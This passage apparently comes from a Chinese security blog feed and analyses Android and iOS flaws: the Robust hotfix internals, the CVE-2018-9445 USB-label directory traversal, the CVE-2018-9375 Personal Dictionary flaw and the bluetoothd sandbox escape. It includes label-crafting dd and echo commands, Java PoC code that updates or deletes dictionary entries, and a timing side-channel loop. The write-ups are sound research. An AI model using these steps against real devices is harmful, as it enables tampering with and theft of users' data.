class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PatchProxy中的isSupport()会调用changeQuickRedirect中的isSupport()，也就是补丁类中的isSupport()：</span><br><span class="line"></span><br><span class="line">![upload successful](/images/pasted-121.png)</span><br><span class="line"></span><br><span class="line">由于arg5是“className:methodName:isStatic:methodNumber”格式，上述isSupport()相当于return “:22:”.contains(methodNumber)。</span><br><span class="line"></span><br><span class="line">接着，我们看一下accessDispatch的实现：</span><br></pre></td></tr></table></figure><p>public static Object accessDispatch(Object[] paramsArray, Object current, ChangeQuickRedirect changeQuickRedirect, boolean isStatic, int methodNumber, Class[] paramsClassTypes, Class returnType) {</p><pre><code>    //同样获取 classMethod = className + &quot;:&quot; + methodName + &quot;:&quot; + isStatic + &quot;:&quot; + methodNumber;    String classMethod = getClassMethod(isStatic, methodNumber);    if (TextUtils.isEmpty(classMethod)) {        return null;    }    Object[] objects = getObjects(paramsArray, current, isStatic);    //调用changeQuickRedirect.accessDispatch。    return changeQuickRedirect.accessDispatch(classMethod, objects);}</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PatchProxy.accessDispatch调用changeQuickRedirect.accessDispatch：</span><br><span class="line"></span><br><span class="line">![upload successful](/images/pasted-122.png)</span><br><span class="line"></span><br><span class="line">先判断函数是否为static函数，再获取函数的参数列表，根据methodNumber，选取要执行的patch方法去执行。此时，便完成了补丁的执行。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Robust总结</span><br><span class="line">1. Robust的优缺点</span><br><span class="line"></span><br><span class="line">- 优点</span><br><span class="line">兼容性高，开发透明；</span><br><span class="line">实时生效。</span><br><span class="line">- 缺点</span><br><span class="line">每个方法都会增加一段代码，会增大发布包的体积；</span><br><span class="line">每个方法都有一个判断，影响运行效率；</span><br><span class="line"></span><br><span class="line">2. 寻找robust热补丁的位置</span><br><span class="line">1. 查找PatchManipulateImp类或其派生类，其中setLocalPath一般为原始补丁路径，setTempPath为解密后的补丁路径，一般解密后就会删除；fetchPatchList函数为获取补丁的逻辑，verifyPatch函数为补丁校验逻辑；</span><br><span class="line">    2. Hook dexclassLoader的构造函数,dex路径为其参数</span><br></pre></td></tr></table></figure><pre><code>        var dexclassLoader = Java.use(&quot;dalvik.system.DexClassLoader&quot;);    //hook 构造函数$init    dexclassLoader.$init.implementation = function(dexPath,optimizedDirectory,librarySearchPath,parent){        console.log(&quot;=====================\n&quot;)        console.log(&quot;dexPath: &quot;+dexPath);        console.log(&quot;optimizedDirectory: &quot;+optimizedDirectory);        console.log(&quot;librarySearchPath: &quot;+librarySearchPath);        console.log(&quot;parent: &quot;+parent);      this.$init(dexPath,optimizedDirectory,librarySearchPath,parent);    }```</code></pre><p>参考资料：</p><ol><li><a href="https://github.com/Meituan-Dianping/Robust/blob/master/README-zh.md" target="_blank" rel="noopener">https://github.com/Meituan-Dianping/Robust/blob/master/README-zh.md</a></li><li><a href="https://bbs.pediy.com/thread-229597.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-229597.htm</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>CVE-2018-9445 —— Android挂载外设的目录穿越</title>
      <link href="/2018/08/14/CVE-2018-9445-%E2%80%94%E2%80%94-Android-USB%E4%B8%8A%E7%9A%84%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
      <url>/2018/08/14/CVE-2018-9445-%E2%80%94%E2%80%94-Android-USB%E4%B8%8A%E7%9A%84%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Android的USB有host和Accessory两种模式，处于Host模式下的Android设备可以对外围设备进行交互，如读取U盘数据、USB键盘鼠标等。当有外设插入到Android设备上时，系统读取外设的一些硬件信息（如LABEL、UUID等）并自动为其挂载。</p><p>常见的USB设备有以下几种：</p><ul><li>USB Sticks<br>即U盘，用于手机和U盘之间拷贝数据，即使处于锁屏状态，系统也会自动mount。（Android 9之后，系统阻止了锁屏情况下的mount）</li><li>USB keyboards<br>USB键盘或鼠标，可以用来操控手机，在锁屏下也会自动mount。</li><li>USB ethernet adapters<br>USB网卡，插入手机后，通过DHCP可以获取ip地址联通网络，锁屏下也可以使用</li></ul><p>Android系统中由Vold进程（Volume Daemon）负责管理和控制外设，Vold进程如果在挂载外设时没有正确的对硬件信息进行解析，则有可能出现安全问题。CVE-2018-9445就是Vold在挂载外设时，由于未正确获取UUID导致的目录穿越问题。</p><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>当USB设备插到Android手机上时，Vold进程（Volume Daemon）会自动为USB设备进行mount，即使手机处于锁屏状态。Vold进程在mount之前需要知道所连接设备的一些硬件信息，如UUID、type、Label等，其具体实现在system/vold/Utils.cpp的readMetadata()函数中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">https://android.googlesource.com/platform/system/vold/+/master/Utils.cpp#212</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">std::vector&lt;std::string&gt; cmd;</span><br><span class="line">    cmd.push_back(kBlkidPath);</span><br><span class="line">    cmd.push_back(&quot;-c&quot;);</span><br><span class="line">    cmd.push_back(&quot;/dev/null&quot;);</span><br><span class="line">    cmd.push_back(&quot;-s&quot;);</span><br><span class="line">    cmd.push_back(&quot;TYPE&quot;);</span><br><span class="line">    cmd.push_back(&quot;-s&quot;);</span><br><span class="line">    cmd.push_back(&quot;UUID&quot;);</span><br><span class="line">    cmd.push_back(&quot;-s&quot;);</span><br><span class="line">    cmd.push_back(&quot;LABEL&quot;);</span><br><span class="line">    cmd.push_back(path);</span><br><span class="line"> </span><br><span class="line">    std::vector&lt;std::string&gt; output;</span><br><span class="line">    status_t res = ForkExecvp(cmd, output, untrusted ? sBlkidUntrustedContext : sBlkidContext);</span><br><span class="line">    if (res != OK) &#123;</span><br><span class="line">        LOG(WARNING) &lt;&lt; &quot;blkid failed to identify &quot; &lt;&lt; path;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    char value[128];</span><br><span class="line">    for (const auto&amp; line : output) &#123;</span><br><span class="line">        // Extract values from blkid output, if defined</span><br><span class="line">        const char* cline = line.c_str();</span><br><span class="line">        const char* start = strstr(cline, &quot;TYPE=&quot;);</span><br><span class="line">        //读取127个字符，遇到引号停止</span><br><span class="line">        if (start != nullptr &amp;&amp; sscanf(start + 5, &quot;\&quot;%127[^\&quot;]\&quot;&quot;, value) == 1) &#123;</span><br><span class="line">            fsType = value;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        start = strstr(cline, &quot;UUID=&quot;);</span><br><span class="line">        if (start != nullptr &amp;&amp; sscanf(start + 5, &quot;\&quot;%127[^\&quot;]\&quot;&quot;, value) == 1) &#123;</span><br><span class="line">            fsUuid = value;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        start = strstr(cline, &quot;LABEL=&quot;);</span><br><span class="line">        if (start != nullptr &amp;&amp; sscanf(start + 6, &quot;\&quot;%127[^\&quot;]\&quot;&quot;, value) == 1) &#123;</span><br><span class="line">            fsLabel = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该函数通过调用了blkid命令，从结果中依次按行读取字符串分别对TYPE、UUID和LABEL进行解析。<br>在Android中运行blkid命令（需要root权限）结果如下图：</p><p><img src="/images/pasted-105.png" alt="upload successful"></p><p>默认情况下，Android系统将USB设备mount在/mnt/media_rw/目录下，且以UUID为文件名，例如：</p><p><img src="/images/pasted-106.png" alt="upload successful"></p><p>通常情况下UUID字段不会包含特殊字符，因为它是blkid经过格式化输出的二进制字符串，TYPE字段是固定的几种文件系统格式类型，如fat、ext、ntfs等，而LABEL字段可以自定义，该字段即外设的名称，允许用户自定义。</p><p>需要注意的是Android上运行blkid后会首先输出LABEL，通过构造特殊的LABEL,我们可以实现注入攻击:</p><p>根据readMetadata()函数的代码，UUID由运行”blkid -c /dev/null -s TYPE -s UUID -s LABEL”后的结果解析得出，因此，如果设备的LABEL的值为“aaa  UUID=”../../sdcard””,运行上述命令后，结果为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LABEL=&quot;aaa UUID=&quot;../../sdcard&quot;&quot; UUID=&quot;4823-0029&quot; TYPE=&quot;vfat&quot;</span><br></pre></td></tr></table></figure></p><p>此时被sscanf解析后的UUID值变成了“../../sdcard”，被系统mount后就会创建/mnt/media_rw/../../sdcard目录，导致了目录穿越。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接在操作系统中更改USB外设的LABEL值相当于修改文件名，在操作系统中修改文件名为包含“../”的字符串是不可行的，我们需要通过文件系统进行修改。</p><p>由于romfs文件格式比较简单(如下图)，我们直接使用echo就可以对其LABEL值进行修改，</p><p><img src="/images/pasted-112.png" alt="upload successful"><br>修改LABEL(上图中的volume name字段)值为<strong>TYPE=”vfat” UUID=”../../data”</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;-rom1fs-########TYPE=&quot;vfat&quot; UUID=&quot;../../data&quot;&apos; &gt; /dev/block/sda1</span><br></pre></td></tr></table></figure></p><p>更改后，运行blkid命令：</p><p><img src="/images/pasted-108.png" alt="upload successful"></p><p>插入修改后的设备后，发现并没有mount成功。查看logcat，发现UUID确实会被识别为“../../data”，但fsck_msdos出现了错误</p><p><img src="/images/pasted-109.png" alt="upload successful"></p><p>这是因为虽然我们提供的type为vfat，但内核在读取文件头部时，获取的文件格式为romfs。而fsck_msdos是用来处理vfat格式，因此出现了错误。</p><p>为了不产生fsck_msdos错误，我们创建一个文件格式为vfat，LABEL为自定义的真实USB设备：</p><ol><li><p>修改USB设备文件格式为vfat，设置label为AAAAAAAAAAA(经测试vfat的label最多为11个字符，超过11个将会自动截断)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.vfat -n &apos;AAAAAAAAAAA&apos; /dev/block/sda1</span><br></pre></td></tr></table></figure></li><li><p>通过dd命令查找AAAAAAAAAAA字符串并替换为’UUID=”../aa’（替换后的字符长度必须和之前相同，UUID=”../aa为11个字符）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/block/sda1 bs=1M count=200 | sed &apos;s|AAAAAAAAAAA|UUID=&quot;../aa|g&apos; | dd of=/dev/block/sda1 bs=1M</span><br></pre></td></tr></table></figure></li><li><p>插入修改后的usb设备，我们可以看到/mnt/目录下多了aa文件</p></li></ol><p><img src="/images/pasted-110.png" alt="upload successful"></p><p>运行mount|grep aa进一步验证：<br><img src="/images/pasted-111.png" alt="upload successful"></p><p>上述过程完成了漏洞的验证，但局限在于vfat的LABEL最多只有11个字符，由于UUID=”本身占用了6个字符，只剩下5个字符可以控制。这意味着我们只能向上穿越一层，且mount后的目录只有2个字符。考虑到romfs格式的LABEL允许更大的长度（romfs格式中的LABEL字段遇到\0才会结束），因此，为了实现更大的攻击，需要在USB协议上进行攻击：</p><p>即实现一个USB硬件，使系统读取blkfs时外设获取的为romfs格式，mount操作时外设告知系统自己为vfat格式。（<strong>vfat为了保证外设可以被mount为外部存储设备，romfs为了保证LABEL有足够长进而可以穿越到其他路径</strong>）</p><p>漏洞原作者使用树莓派开启USB模式作为一个USB硬件，实现了从Pixel 2设备中窃取照片的PoC（<a href="https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/45192.zip)，这个PoC假设了一种场景，即存在一个app在收到外设mount事件后会自动把本机照片写入外设。为实现该场景，需要修改AOSP源码编译到Pixel设备，新增了部分代码实现一个MountReceiver，在收到mount事件后自动将DCIM目录下的照片复制到data/exfiltrate-photo目录。利用漏洞构造一个USB外设使外设被mount到/data目录，进而实现照片文件的窃取。" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/45192.zip)，这个PoC假设了一种场景，即存在一个app在收到外设mount事件后会自动把本机照片写入外设。为实现该场景，需要修改AOSP源码编译到Pixel设备，新增了部分代码实现一个MountReceiver，在收到mount事件后自动将DCIM目录下的照片复制到data/exfiltrate-photo目录。利用漏洞构造一个USB外设使外设被mount到/data目录，进而实现照片文件的窃取。</a></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>CVE-2018-9445这个漏洞出现的根本原因有2个：</p><ol><li>Vold进程在获取TYPE、UUID和LABEL时，使用不严格的字符串匹配方式来读取内容；</li><li>Android系统中的blkid并未按照期待的顺序（TYPE、UUID和LABEL）输出，而是最先输出可自定义的LABEL值；</li></ol><p>结合了上述两个问题，最终导致了mount时的目录穿越。</p><p>漏洞修复时也是针对这2点分别进行了修复：</p><ol><li><p>在blkid的输出内容里过滤掉了引号<br><img src="/images/pasted-113.png" alt="upload successful"></p></li><li><p>使用strstr是增加了对引号的匹配<br><img src="/images/pasted-114.png" alt="upload successful"></p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CVE-2018-9445是一个典型的字符串注入攻击，一般的注入漏洞常常发生在exec的参数中，即命令注入，这个漏洞虽然也和exec有关，但是由exec的结果导致下游解析出现了目录穿越。关注解析字符串的代码和exec相关的代码，可能还会有其他的问题。</p><p>参考：</p><ol><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1583" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1583</a></li><li><a href="https://www.exploit-db.com/exploits/45192/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/45192/</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>cve-2018-9375 —— Android Personal Dictionary漏洞分析</title>
      <link href="/2018/08/13/cve-2018-9375-%E2%80%94%E2%80%94-Android%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2018/08/13/cve-2018-9375-%E2%80%94%E2%80%94-Android%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="关于Personal-Dictionary（个人字典）"><a href="#关于Personal-Dictionary（个人字典）" class="headerlink" title="关于Personal Dictionary（个人字典）"></a>关于Personal Dictionary（个人字典）</h2><p>Personal Dictionary（个人字典）是Android系统提供的一个自定义的字典，用于存放用户经常输入的数据或字符以提高输入效率，它位于“设置”—— “语言和输入法” —— “个人字典”中，某些情况下Personal Dictionary中可能存放用户的隐私信息，如密码、地址、电话、信用卡账号等信息。<br><a href="https://ioactive.com/wp-content/uploads/2018/07/exploit-user-dictionary-poc.png" target="_blank" rel="noopener">https://ioactive.com/wp-content/uploads/2018/07/exploit-user-dictionary-poc.png</a><br><img src="/images/pasted-99.png" alt="upload successful"></p><p>用户也可以为一个字符串自定义一个shortcut，例如输入myhome，会自动出来详细的地址<br><a href="https://ioactive.com/wp-content/uploads/2018/07/exploit-user-dictionary-poc2.png" target="_blank" rel="noopener">https://ioactive.com/wp-content/uploads/2018/07/exploit-user-dictionary-poc2.png</a><br><img src="/images/pasted-100.png" alt="upload successful"></p><p>在Andorid系统内部，这些字符保存在一个sqlite数据库中，表名称为“words”，其中包含6个列：<br>_id (INTEGER, PRIMARY KEY)<br>word (TEXT)<br>frequency (INTEGER)<br>locale (TEXT)<br>appid (INTEGER)<br>shortcut (TEXT)</p><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>早期版本的Android系统中，操作Personal Dictionary需要申请权限：<br>android.permission.READ_USER_DICTIONARY<br>android.permission.WRITE_USER_DICTIONARY<br>从Android 6.0（API 23）开始, Android规定只有IME和spellchecker才可以操作Personal Dictionary，并提供了对应的provider —— content://user_dictionary/words</p><p>com.android.providers.userdictionary.UserDictionaryProvider实现了对Personal Dictionary增删查改，canCallerAccessUserDictionary（）函数进行权限检查，参考：<a href="https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/master/src/com/android/providers/userdictionary/UserDictionaryProvider.java" target="_blank" rel="noopener">https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/master/src/com/android/providers/userdictionary/UserDictionaryProvider.java</a></p><p>然后在实现delete和update函数时，一个奇葩的错误出现了，代码会先完成删除或更新操作，最后在检查权限，那么就造成了任何进程都可以进行delete和update操作了。</p><p>存在漏洞的delete实现：<br><img src="/images/pasted-101.png" alt="upload successful"></p><p>存在漏洞的update实现：<br><img src="/images/pasted-102.png" alt="upload successful"></p><p>此外，检查AndroidMefest.xml文件发现对UserDictionaryProvider的访问也没有任何限制</p><p>![upload successful](/images/pasted-103.png</p><p>因此，本地恶意应用利用该漏洞可以任意delete和update用户的Personal Dictionary了。</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ContentValues values = new ContentValues();</span><br><span class="line">values.put(UserDictionary.Words.WORD, &quot;m4bln&quot;);</span><br><span class="line">//更新</span><br><span class="line">getContentResolver().update(UserDictionary.Words.CONTENT_URI, values,null, null);</span><br><span class="line">//删除</span><br><span class="line">getContentResolver().delete(UserDictionary.Words.CONTENT_URI, null, null);</span><br></pre></td></tr></table></figure><h2 id="利用侧信道进一步利用"><a href="#利用侧信道进一步利用" class="headerlink" title="利用侧信道进一步利用"></a>利用侧信道进一步利用</h2><p>上述漏洞仅能实现更新和删除Personal Dictionary，造成的影响有限，但如果能读取的话就比较严重了。</p><p>由于where参数可以完全被攻击者控制，并且成功执行更新操作的语句与不执行任何操作的同一语句相比用时更长，所以可以利用侧信道的方式来猜测Personal Dictionary。</p><p>例如,当数据库中存在以“a”开头的数据时，运行如下代码200次得出的时间会比没有“a”开头的数据要短，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ContentValues values = new ContentValues();</span><br><span class="line">values.put(UserDictionary.Words._ID, 1);</span><br><span class="line"></span><br><span class="line">long t0 = System.nanoTime();</span><br><span class="line">for (int i=0; i&lt;200; i++) &#123;</span><br><span class="line">    getContentResolver().update(UserDictionary.Words.CONTENT_URI, values,</span><br><span class="line">                    &quot;_id = 1 AND word LIKE &apos;a%&apos;&quot;, null);</span><br><span class="line">&#125;</span><br><span class="line">long t1 = System.nanoTime();</span><br></pre></td></tr></table></figure></p><p>因此，利用基于时间差的方法，可以依次猜测出第二个、第三个字符，直至猜到所有字符。</p><p>漏洞作者提供了Exploit: <a href="https://github.com/IOActive/AOSP-ExploitUserDictionary" target="_blank" rel="noopener">https://github.com/IOActive/AOSP-ExploitUserDictionary</a></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>修复当然很简单，把权限检查放到开头就行了。这个漏洞的出现确实很奇葩，query、insert等函数的实现都是先check权限后操作，唯独delete和update存在漏洞，而且据作者描述，该漏洞存在了3年都没人发现！！！看来阅读和理解源代码确实需要一番功夫。</p><p>参考：</p><ol><li><a href="https://ioactive.com/discovering-and-exploiting-a-vulnerability-in-androids-personal-dictionary/" target="_blank" rel="noopener">https://ioactive.com/discovering-and-exploiting-a-vulnerability-in-androids-personal-dictionary/</a></li><li><a href="https://github.com/IOActive/AOSP-ExploitUserDictionary" target="_blank" rel="noopener">https://github.com/IOActive/AOSP-ExploitUserDictionary</a></li><li><a href="https://developer.android.com/reference/android/provider/UserDictionary" target="_blank" rel="noopener">https://developer.android.com/reference/android/provider/UserDictionary</a></li><li><a href="https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/cccf7d5c98fc81ff4483f921fb4ebfa974add9c6%5E%21/#F0" target="_blank" rel="noopener">https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/cccf7d5c98fc81ff4483f921fb4ebfa974add9c6%5E%21/#F0</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>利用蓝牙callback逃逸iOS沙箱</title>
      <link href="/2018/08/10/%E5%88%A9%E7%94%A8%E8%93%9D%E7%89%99%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8iOS%E6%B2%99%E7%AE%B1/"/>
      <url>/2018/08/10/%E5%88%A9%E7%94%A8%E8%93%9D%E7%89%99%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8iOS%E6%B2%99%E7%AE%B1/</url>
      
        <content type="html"><![CDATA[<h2 id="iOS的Sandbox和IPC机制"><a href="#iOS的Sandbox和IPC机制" class="headerlink" title="iOS的Sandbox和IPC机制"></a>iOS的Sandbox和IPC机制</h2><p>iOS的sandbox限制了普通的应用程序只能访问自身沙箱内的资源，应用程序在进行系统调用时会受到sandbox的策略限制。因此，为了实现权限提升，逃逸iOS的sandbox是必要的。</p><p>iOS系统提供了IPC机制（进程间通信），如URL schemes, Mach, pipes等，Mach IPC是一套面向消息的IPC机制，实现对象与对象之间的通信，源对象发送一条消息，这条消息加入到目标对象的队列中等待处理。如果产生应答，则通过另一条消息传递回去。<br>消息分简单消息和复杂消息，分别对应两种不同的结构：</p><ul><li>简单消息</li></ul><p><img src="/images/pasted-86.png" alt="upload successful"></p><ul><li>复杂消息</li></ul><p><img src="/images/pasted-87.png" alt="upload successful"></p><p>Mach对象之间的消息时基于端口传递的，消息从某一个端口发送到另一个端口。向一个端口发送消息实际上是将消息放在队列中，直到消息被处理。查找一个对象的句柄(标识应用程序中的不同对象和同类中的不同的实例的值)，实际上查找的是这个对象端口的句柄，给定一个对象的端口，就可以通信了。Mach消息传递使用的是Mach_msg()函数。</p><p>基于Mach的消息机制，iOS又提供了XPC、NSXPC等进程间通信机制，通过这些机制，sandbox内的应用可以和没有sandbox的Mach service进行通信，如果这些service在处理消息时发生错误，就有可能出现由sandbox到非sandbox的代码执行。</p><p>为了发现这些问题，我们将目标放在Mach service的消息处理上，那么如何找到实现Mach service的binary文件呢？</p><p>/System/Library/LaunchDaemons的plist文件包含了大多数Mach service，其中MachServices字段指向了一组Mach services,ProgramArguments字段指向实现这些Mach service的binary文件。</p><p><img src="/images/pasted-88.png" alt="upload successful"></p><h2 id="CVE-2018-4087——-利用bluetoothd绕过sandbox"><a href="#CVE-2018-4087——-利用bluetoothd绕过sandbox" class="headerlink" title="CVE-2018-4087—— 利用bluetoothd绕过sandbox"></a>CVE-2018-4087—— 利用bluetoothd绕过sandbox</h2><p>com.apple.server.bluetooth是众多Mach service的其中一个，它由bluetoothd来实现，并通过Mach消息机制与普通的应用程序进行通信。</p><p>bluetoothd启动一个端口并在该端口接收队列的消息，其处理逻辑由apple_bluetoothd_mig_server函数实现，</p><p><img src="/images/pasted-89.png" alt="upload successful"></p><p>apple_bluetoothd_mig_server根据接收到的消息的msgid执行不同的callback函数，漏洞作者给所有的callback函数加上了符号，如下图：</p><p><img src="/images/pasted-90.png" alt="upload successful"></p><p>mach__BTLocalDeviceAddCallbacks是msgid为3时对应的callback，它主要实现注册一个回调函数的功能，回调函数的地址由消息的发送方给出。当触发相应的事件时，控制流即走向了回调函数。</p><p><img src="/images/pasted-91.png" alt="upload successful"></p><p>理论上讲，当一个对象与bluetoothd建立连接时，需要产生一个session token, bluetoothd根据这个token来判断收到的消息是不是来自这个对象。但是bluetoothd的session token值为mach_port_t类型，意味着这个值是很容易爆破的（0x0000 -0xFFFF）。</p><p>获得session后就挟持其他对象和bluetoothd的通信了，结合上述注册回调函数的功能，不难看出，我们可以冒充其他对象注册回调函数，即控制代码由bluetoothd走到一个任意回调函数，从汇编角度讲，我们通过挟持其他对象和bluetoothd的通信控制了PC。</p><p>为了实现sandbox逃逸，这个回调函数地址应该位于一个unsandbox进程中，作者给出了所有在bluetoothd上注册callback的unsandbox进程：<br>SpringBoard<br>mDNSResponder<br>aggregated<br>wifid<br>Preferences<br>CommCenter<br>iaptransportd<br>findmydeviced<br>routined<br>UserEventAgent<br>carkitd<br>mediaserverd<br>bluetoothd<br>coreduetd</p><p>[引文1]（<a href="https://weibo.com/ttarticle/p/show?id=2309404271293301154324#_0）中给出了两幅图很形象的展示了这个攻击过程：" target="_blank" rel="noopener">https://weibo.com/ttarticle/p/show?id=2309404271293301154324#_0）中给出了两幅图很形象的展示了这个攻击过程：</a></p><p><img src="/images/pasted-92.png" alt="upload successful"></p><p><img src="/images/pasted-93.png" alt="upload successful"></p><p>作者提供的PoC:<a href="https://github.com/rani-i/bluetoothdPoC/blob/master/bluetoothdPoC/main.m" target="_blank" rel="noopener">https://github.com/rani-i/bluetoothdPoC/blob/master/bluetoothdPoC/main.m</a>  该漏洞在iOS – 11.2.5上完成修复。</p><h2 id="再次发现bluetoothd漏洞并利用"><a href="#再次发现bluetoothd漏洞并利用" class="headerlink" title="再次发现bluetoothd漏洞并利用"></a>再次发现bluetoothd漏洞并利用</h2><p>iOS 11.2.5修复了上述漏洞，通过增加了一个随机的user_id字段作为鉴别通信的依据。如下图所示：</p><p><img src="/images/pasted-94.png" alt="upload successful"></p><p>然而，研究人员通过分析，又发现两个新的0day。bluetoothd中的BTAccessoryManagerAddCallbacks()并没有实现user_id验证机制，这意味着依然可以使用上述漏洞。</p><p>但是BTAccessoryManagerAddCallbacks只有在蓝牙连接到一个新设备上时才会触发，研究人员又发现了在蓝牙扫描程序中的一个新bug,一个sandbox应用可以通过BTDiscoveryAgentCreate()创建一个扫描代理，并通过BTDiscoveryAgentStartScan() 去触发BTAccessoryManagerAddCallbacks事件。</p><p>这两个漏洞（CVE-2018-4330 and CVE-2018-4327）在iOS 11.4.1中被修复。</p><h2 id="漏洞的进一步利用"><a href="#漏洞的进一步利用" class="headerlink" title="漏洞的进一步利用"></a>漏洞的进一步利用</h2><h3 id="从控制PC到ROP"><a href="#从控制PC到ROP" class="headerlink" title="从控制PC到ROP"></a>从控制PC到ROP</h3><p>利用上述漏洞仅仅能控制PC，为了实现RCE我们需要进一步布局，这里利用了ROP和堆喷射。作者提到使用了MACH_MSGH_BITS_COMPLEX 和 MACH_MSG_OOL_DESCRIPTOR Mach消息实现了堆喷，如果发送这类消息没有收到任何回复，则消息内容将会留存在目标进程的内存空间。</p><p><img src="/images/pasted-95.png" alt="upload successful"></p><p>为了挟持程序流，我们还需要操纵栈寄存器，即实现stack pivot。</p><p>作者在libsystem_platform.dylib发现一条ROP链，通过控制了X0寄存器进而达到了控制SP。</p><p><img src="/images/pasted-96.png" alt="upload successful"></p><h3 id="从ROP到task-port"><a href="#从ROP到task-port" class="headerlink" title="从ROP到task port"></a>从ROP到task port</h3><p>在iOS中，一个进程的task port可以被用来控制该进程的内存和寄存器，task port通过mach_task_self()来获取，第三方进程可以通过这个task port去操纵目标进程，例如：<br>mach_vm_allocate(target_task_port, &amp;remote_addr, remote_size, 1) 可以在目标进程中分配内存，mach_vm_write(target_task_port, remote_address, local_address, length)可以向目标进程中写入数据。</p><p>因此，unsandbox进程被控制后，将其task port发送给sandbox进程，sandbox进程进而实现了完全控制。具体实现如下：<br>pwn app使用mach_port_allocate()分配0x1000个port,并使用mach_port_insert_right() 在这些port中插入send right,之后通过MACH_MSG_PORT_DESCRIPTOR类型的OOL 消息发送到目标进程。下一步通过堆喷和ROP对内存布局，触发漏洞后控制PC,目标进程将task port返回给pwn app。</p><p>整个过程如下图：<br><img src="/images/pasted-97.png" alt="upload successful"></p><p>遗憾的是，iOS 11限制了sandbox进程对task port的访问，这种方法已经不再适用。</p><h3 id="另一种方案"><a href="#另一种方案" class="headerlink" title="另一种方案"></a>另一种方案</h3><p>即使不能用task 